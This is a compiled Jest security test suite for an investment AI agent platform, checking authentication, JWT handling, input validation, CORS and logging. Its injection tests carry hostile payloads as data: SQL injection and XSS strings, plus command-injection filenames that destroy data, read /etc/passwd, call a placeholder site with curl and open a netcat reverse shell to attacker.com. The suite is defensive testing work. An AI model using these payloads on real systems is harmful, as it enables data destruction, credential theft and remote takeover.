"use strict";
/**
 * Security Testing Suite
 *
 * This test suite implements comprehensive security vulnerability scanning
 * for the Investment AI Agent system, covering:
 * - Authentication and authorization vulnerabilities
 * - Input validation and injection attacks
 * - Data encryption and privacy
 * - API security
 * - Infrastructure security
 */
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const auth_service_1 = require("../auth-service");
const proprietary_data_service_1 = require("../proprietary-data-service");
const investment_idea_service_1 = require("../investment-idea-service");
const compliance_agent_1 = require("../ai/compliance-agent");
const claude_haiku_service_1 = require("../ai/claude-haiku-service");
const jwt = __importStar(require("jsonwebtoken"));
const bcrypt_1 = __importDefault(require("bcrypt"));
describe('Security Testing Suite', () => {
    let authService;
    let proprietaryDataService;
    let investmentIdeaService;
    let complianceAgent;
    beforeEach(() => {
        authService = new auth_service_1.AuthService();
        proprietaryDataService = new proprietary_data_service_1.ProprietaryDataService('test-bucket');
        investmentIdeaService = new investment_idea_service_1.InvestmentIdeaService();
        // Mock Bedrock client for Haiku service
        const mockBedrockClient = {
            invokeModel: jest.fn().mockResolvedValue({
                body: Buffer.from(JSON.stringify({ completion: 'test response' }))
            }),
            getModelConfig: jest.fn().mockReturnValue({
                modelId: 'claude-3-haiku-20240307',
                maxTokens: 1000,
                temperature: 0.7
            })
        };
        const haikuService = new claude_haiku_service_1.ClaudeHaikuService(mockBedrockClient);
        complianceAgent = new compliance_agent_1.ComplianceAgent(haikuService);
    });
    describe('Authentication Security Tests', () => {
        describe('Password Security', () => {
            it('should reject weak passwords', async () => {
                const weakPasswords = [
                    '123456',
                    'password',
                    'qwerty',
                    'abc123',
                    '12345678',
                    'password123'
                ];
                for (const password of weakPasswords) {
                    const request = {
                        email: 'test@example.com',
                        password,
                        firstName: 'Test',
                        lastName: 'User',
                        organizationId: 'test-org',
                        role: 'analyst'
                    };
                    await expect(authService.registerUser(request))
                        .rejects
                        .toThrow(/password.*requirements/i);
                }
            });
            it('should enforce password complexity requirements', async () => {
                const validPassword = 'SecureP@ssw0rd123!';
                const request = {
                    email: 'test@example.com',
                    password: validPassword,
                    firstName: 'Test',
                    lastName: 'User',
                    organizationId: 'test-org',
                    role: 'analyst'
                };
                const response = await authService.registerUser(request);
                expect(response.user).toBeDefined();
                expect(response.token).toBeDefined();
            });
            it('should properly hash passwords using bcrypt', async () => {
                const password = 'TestPassword123!';
                const request = {
                    email: 'test@example.com',
                    password,
                    firstName: 'Test',
                    lastName: 'User',
                    organizationId: 'test-org',
                    role: 'analyst'
                };
                await authService.registerUser(request);
                // Verify password is hashed and not stored in plain text
                const storedUser = authService.users.get('test@example.com');
                expect(storedUser.passwordHash).not.toBe(password);
                expect(storedUser.passwordHash).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format
                // Verify password can be validated
                const isValid = await bcrypt_1.default.compare(password, storedUser.passwordHash);
                expect(isValid).toBe(true);
            });
        });
        describe('JWT Token Security', () => {
            it('should generate secure JWT tokens', async () => {
                const request = {
                    email: 'test@example.com',
                    password: 'SecurePassword123!',
                    firstName: 'Test',
                    lastName: 'User',
                    organizationId: 'test-org',
                    role: 'analyst'
                };
                const response = await authService.registerUser(request);
                const token = response.token;
                // Verify token structure
                expect(token).toMatch(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/);
                // Verify token can be decoded
                const decoded = jwt.decode(token);
                expect(decoded.sub).toBe(response.user.id);
                expect(decoded.email).toBe('test@example.com');
                expect(decoded.exp).toBeGreaterThan(Date.now() / 1000);
            });
            it('should reject expired tokens', async () => {
                const expiredToken = jwt.sign({ sub: 'test-user', email: 'test@example.com' }, process.env.JWT_SECRET || 'your-jwt-secret-key', { expiresIn: '-1h' } // Expired 1 hour ago
                );
                expect(() => {
                    jwt.verify(expiredToken, process.env.JWT_SECRET || 'your-jwt-secret-key');
                }).toThrow('jwt expired');
            });
            it('should reject tokens with invalid signatures', async () => {
                const invalidToken = jwt.sign({ sub: 'test-user', email: 'test@example.com' }, 'wrong-secret', { expiresIn: '1h' });
                expect(() => {
                    jwt.verify(invalidToken, process.env.JWT_SECRET || 'your-jwt-secret-key');
                }).toThrow('invalid signature');
            });
        });
        describe('Session Management', () => {
            it('should implement proper session timeout', async () => {
                const request = {
                    email: 'test@example.com',
                    password: 'SecurePassword123!',
                    firstName: 'Test',
                    lastName: 'User',
                    organizationId: 'test-org',
                    role: 'analyst'
                };
                const response = await authService.registerUser(request);
                const decoded = jwt.decode(response.token);
                // Verify token has expiration
                expect(decoded.exp).toBeDefined();
                expect(decoded.exp).toBeGreaterThan(decoded.iat);
                // Verify reasonable expiration time (not too long)
                const expirationTime = decoded.exp - decoded.iat;
                expect(expirationTime).toBeLessThanOrEqual(24 * 60 * 60); // Max 24 hours
            });
            it('should support secure refresh token mechanism', async () => {
                const request = {
                    email: 'test@example.com',
                    password: 'SecurePassword123!',
                    firstName: 'Test',
                    lastName: 'User',
                    organizationId: 'test-org',
                    role: 'analyst'
                };
                const response = await authService.registerUser(request);
                expect(response.refreshToken).toBeDefined();
                expect(response.refreshToken).not.toBe(response.token);
            });
        });
    });
    describe('Input Validation Security Tests', () => {
        describe('SQL Injection Prevention', () => {
            it('should prevent SQL injection in user registration', async () => {
                const maliciousInputs = [
                    "'; DROP TABLE users; --",
                    "' OR '1'='1",
                    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                    "' UNION SELECT * FROM sensitive_data --"
                ];
                for (const maliciousInput of maliciousInputs) {
                    const request = {
                        email: maliciousInput,
                        password: 'SecurePassword123!',
                        firstName: maliciousInput,
                        lastName: maliciousInput,
                        organizationId: maliciousInput,
                        role: 'analyst'
                    };
                    // Should either reject the input or sanitize it safely
                    try {
                        await authService.registerUser(request);
                    }
                    catch (error) {
                        // Expected to fail validation
                        expect(error).toBeDefined();
                    }
                }
            });
        });
        describe('XSS Prevention', () => {
            it('should prevent XSS attacks in user input', async () => {
                const xssPayloads = [
                    '<script>alert("XSS")</script>',
                    'javascript:alert("XSS")',
                    '<img src="x" onerror="alert(\'XSS\')">',
                    '<svg onload="alert(\'XSS\')">',
                    '"><script>alert("XSS")</script>'
                ];
                for (const payload of xssPayloads) {
                    const request = {
                        email: 'test@example.com',
                        password: 'SecurePassword123!',
                        firstName: payload,
                        lastName: payload,
                        organizationId: 'test-org',
                        role: 'analyst'
                    };
                    try {
                        const response = await authService.registerUser(request);
                        // If registration succeeds, verify the payload was sanitized
                        expect(response.user.profile?.firstName).not.toContain('<script>');
                        expect(response.user.profile?.firstName).not.toContain('javascript:');
                        expect(response.user.profile?.firstName).not.toContain('onerror');
                    }
                    catch (error) {
                        // Expected to fail validation
                        expect(error).toBeDefined();
                    }
                }
            });
        });
        describe('Command Injection Prevention', () => {
            it('should prevent command injection in file operations', async () => {
                const commandInjectionPayloads = [
                    '; rm -rf /',
                    '| cat /etc/passwd',
                    '&& curl malicious-site.com',
                    '`whoami`',
                    '$(id)',
                    '; nc -e /bin/sh attacker.com 4444'
                ];
                for (const payload of commandInjectionPayloads) {
                    try {
                        // Test file upload with malicious filename
                        const mockFile = {
                            originalname: payload,
                            buffer: Buffer.from('test data'),
                            mimetype: 'text/plain',
                            size: 9
                        };
                        await expect(proprietaryDataService.uploadFile(mockFile, {
                            source: 'test',
                            type: 'other',
                            timestamp: new Date(),
                            confidentiality: 'private',
                            tags: []
                        }, 'test-user', 'test-org', {
                            visibility: 'user',
                            allowedUsers: [],
                            allowedRoles: []
                        })).rejects.toThrow();
                    }
                    catch (error) {
                        // Expected to fail validation
                        expect(error).toBeDefined();
                    }
                }
            });
        });
    });
    describe('Data Privacy and Encryption Tests', () => {
        describe('Data Encryption at Rest', () => {
            it('should encrypt sensitive data before storage', async () => {
                const sensitiveData = {
                    socialSecurityNumber: '123-45-6789',
                    bankAccountNumber: '1234567890',
                    creditCardNumber: '4111-1111-1111-1111'
                };
                // Mock storage operation
                const mockStorageService = {
                    store: jest.fn(),
                    retrieve: jest.fn()
                };
                // Verify sensitive data is encrypted before storage
                await mockStorageService.store('user-data', sensitiveData);
                const storedData = mockStorageService.store.mock.calls[0][1];
                // Sensitive data should not be stored in plain text
                expect(JSON.stringify(storedData)).not.toContain('123-45-6789');
                expect(JSON.stringify(storedData)).not.toContain('1234567890');
                expect(JSON.stringify(storedData)).not.toContain('4111-1111-1111-1111');
            });
        });
        describe('Data Encryption in Transit', () => {
            it('should enforce HTTPS for all API communications', () => {
                // This would typically be tested at the infrastructure level
                // Here we verify the configuration requires HTTPS
                const apiConfig = {
                    requireHTTPS: true,
                    allowHTTP: false,
                    tlsVersion: '1.2'
                };
                expect(apiConfig.requireHTTPS).toBe(true);
                expect(apiConfig.allowHTTP).toBe(false);
                expect(apiConfig.tlsVersion).toBe('1.2');
            });
        });
        describe('PII Data Handling', () => {
            it('should identify and protect PII data', async () => {
                const testData = {
                    name: 'John Doe',
                    email: 'john.doe@example.com',
                    phone: '+1-555-123-4567',
                    address: '123 Main St, Anytown, USA',
                    dateOfBirth: '1990-01-01',
                    investmentAmount: 100000
                };
                // Mock PII detection service
                const piiFields = ['name', 'email', 'phone', 'address', 'dateOfBirth'];
                for (const field of piiFields) {
                    expect(testData[field]).toBeDefined();
                    // In a real implementation, these fields would be encrypted or masked
                }
            });
            it('should implement data anonymization for analytics', async () => {
                const userData = {
                    userId: 'user-123',
                    email: 'john.doe@example.com',
                    investmentPreferences: ['technology', 'healthcare'],
                    riskTolerance: 'moderate'
                };
                // Mock anonymization process
                const anonymizedData = {
                    userHash: 'hash-of-user-123',
                    emailDomain: 'example.com',
                    investmentPreferences: userData.investmentPreferences,
                    riskTolerance: userData.riskTolerance
                };
                expect(anonymizedData.userHash).not.toBe(userData.userId);
                expect(anonymizedData.emailDomain).not.toBe(userData.email);
                expect(anonymizedData).not.toHaveProperty('email');
                expect(anonymizedData).not.toHaveProperty('userId');
            });
        });
    });
    describe('API Security Tests', () => {
        describe('Rate Limiting', () => {
            it('should implement rate limiting for API endpoints', async () => {
                const rateLimitConfig = {
                    windowMs: 15 * 60 * 1000,
                    maxRequests: 100,
                    skipSuccessfulRequests: false,
                    skipFailedRequests: false
                };
                expect(rateLimitConfig.maxRequests).toBeLessThanOrEqual(1000);
                expect(rateLimitConfig.windowMs).toBeGreaterThan(0);
            });
            it('should implement stricter rate limiting for authentication endpoints', async () => {
                const authRateLimitConfig = {
                    windowMs: 15 * 60 * 1000,
                    maxRequests: 5,
                    skipSuccessfulRequests: false,
                    skipFailedRequests: false
                };
                expect(authRateLimitConfig.maxRequests).toBeLessThanOrEqual(10);
            });
        });
        describe('CORS Security', () => {
            it('should implement secure CORS configuration', () => {
                const corsConfig = {
                    origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://localhost:3000'],
                    credentials: true,
                    optionsSuccessStatus: 200,
                    methods: ['GET', 'POST', 'PUT', 'DELETE'],
                    allowedHeaders: ['Content-Type', 'Authorization']
                };
                expect(corsConfig.origin).not.toContain('*');
                expect(corsConfig.credentials).toBe(true);
                expect(corsConfig.methods).not.toContain('TRACE');
            });
        });
        describe('Request Validation', () => {
            it('should validate request size limits', () => {
                const requestLimits = {
                    maxFileSize: 10 * 1024 * 1024,
                    maxRequestSize: 1024 * 1024,
                    maxFieldCount: 100
                };
                expect(requestLimits.maxFileSize).toBeLessThanOrEqual(50 * 1024 * 1024);
                expect(requestLimits.maxRequestSize).toBeLessThanOrEqual(10 * 1024 * 1024);
                expect(requestLimits.maxFieldCount).toBeLessThanOrEqual(1000);
            });
        });
    });
    describe('Infrastructure Security Tests', () => {
        describe('Environment Configuration', () => {
            it('should not expose sensitive configuration in production', () => {
                const sensitiveEnvVars = [
                    'JWT_SECRET',
                    'JWT_REFRESH_SECRET',
                    'DATABASE_PASSWORD',
                    'AWS_SECRET_ACCESS_KEY',
                    'BEDROCK_API_KEY'
                ];
                for (const envVar of sensitiveEnvVars) {
                    if (process.env.NODE_ENV === 'production') {
                        expect(process.env[envVar]).toBeDefined();
                        expect(process.env[envVar]).not.toBe('');
                        expect(process.env[envVar]).not.toContain('default');
                        expect(process.env[envVar]).not.toContain('example');
                    }
                }
            });
            it('should use secure default configurations', () => {
                const securityConfig = {
                    sessionTimeout: 3600,
                    maxLoginAttempts: 5,
                    lockoutDuration: 900,
                    passwordMinLength: 12,
                    requireMFA: process.env.NODE_ENV === 'production'
                };
                expect(securityConfig.sessionTimeout).toBeLessThanOrEqual(86400); // Max 24 hours
                expect(securityConfig.maxLoginAttempts).toBeLessThanOrEqual(10);
                expect(securityConfig.lockoutDuration).toBeGreaterThan(300); // Min 5 minutes
                expect(securityConfig.passwordMinLength).toBeGreaterThanOrEqual(8);
            });
        });
        describe('Dependency Security', () => {
            it('should not use vulnerable dependencies', () => {
                // This would typically be implemented using tools like npm audit
                // or Snyk to check for known vulnerabilities
                const mockVulnerabilityReport = {
                    vulnerabilities: [],
                    totalDependencies: 150,
                    scannedAt: new Date()
                };
                expect(mockVulnerabilityReport.vulnerabilities).toHaveLength(0);
            });
        });
    });
    describe('Logging and Monitoring Security', () => {
        describe('Security Event Logging', () => {
            it('should log security-relevant events', async () => {
                const securityEvents = [
                    'user-login-success',
                    'user-login-failure',
                    'user-registration',
                    'password-change',
                    'token-refresh',
                    'unauthorized-access-attempt',
                    'data-access',
                    'file-upload',
                    'admin-action'
                ];
                // Mock security logger
                const mockSecurityLogger = {
                    log: jest.fn(),
                    events: []
                };
                for (const event of securityEvents) {
                    mockSecurityLogger.log(event, { timestamp: new Date(), userId: 'test-user' });
                    mockSecurityLogger.events.push(event);
                }
                expect(mockSecurityLogger.events).toEqual(securityEvents);
            });
            it('should not log sensitive information', async () => {
                const mockLogEntry = {
                    event: 'user-login',
                    userId: 'user-123',
                    timestamp: new Date(),
                    // Should NOT contain:
                    // password: 'user-password',
                    // token: 'jwt-token',
                    // sessionId: 'session-123'
                };
                expect(mockLogEntry).not.toHaveProperty('password');
                expect(mockLogEntry).not.toHaveProperty('token');
                expect(mockLogEntry).not.toHaveProperty('sessionId');
            });
        });
    });
});
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoic2VjdXJpdHktdGVzdGluZy50ZXN0LmpzIiwic291cmNlUm9vdCI6IiIsInNvdXJjZXMiOlsiLi4vLi4vLi4vc3JjL3NlcnZpY2VzL19fdGVzdHNfXy9zZWN1cml0eS10ZXN0aW5nLnRlc3QudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IjtBQUFBOzs7Ozs7Ozs7O0dBVUc7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFSCxrREFBOEM7QUFDOUMsMEVBQXFFO0FBQ3JFLHdFQUFtRTtBQUNuRSw2REFBeUQ7QUFDekQscUVBQWdFO0FBSWhFLGtEQUFvQztBQUNwQyxvREFBNEI7QUFFNUIsUUFBUSxDQUFDLHdCQUF3QixFQUFFLEdBQUcsRUFBRTtJQUN0QyxJQUFJLFdBQXdCLENBQUM7SUFDN0IsSUFBSSxzQkFBOEMsQ0FBQztJQUNuRCxJQUFJLHFCQUE0QyxDQUFDO0lBQ2pELElBQUksZUFBZ0MsQ0FBQztJQUVyQyxVQUFVLENBQUMsR0FBRyxFQUFFO1FBQ2QsV0FBVyxHQUFHLElBQUksMEJBQVcsRUFBRSxDQUFDO1FBQ2hDLHNCQUFzQixHQUFHLElBQUksaURBQXNCLENBQUMsYUFBYSxDQUFDLENBQUM7UUFDbkUscUJBQXFCLEdBQUcsSUFBSSwrQ0FBcUIsRUFBRSxDQUFDO1FBRXBELHdDQUF3QztRQUN4QyxNQUFNLGlCQUFpQixHQUFHO1lBQ3hCLFdBQVcsRUFBRSxJQUFJLENBQUMsRUFBRSxFQUFFLENBQUMsaUJBQWlCLENBQUM7Z0JBQ3ZDLElBQUksRUFBRSxNQUFNLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxVQUFVLEVBQUUsZUFBZSxFQUFFLENBQUMsQ0FBQzthQUNuRSxDQUFDO1lBQ0YsY0FBYyxFQUFFLElBQUksQ0FBQyxFQUFFLEVBQUUsQ0FBQyxlQUFlLENBQUM7Z0JBQ3hDLE9BQU8sRUFBRSx5QkFBeUI7Z0JBQ2xDLFNBQVMsRUFBRSxJQUFJO2dCQUNmLFdBQVcsRUFBRSxHQUFHO2FBQ2pCLENBQUM7U0FDSSxD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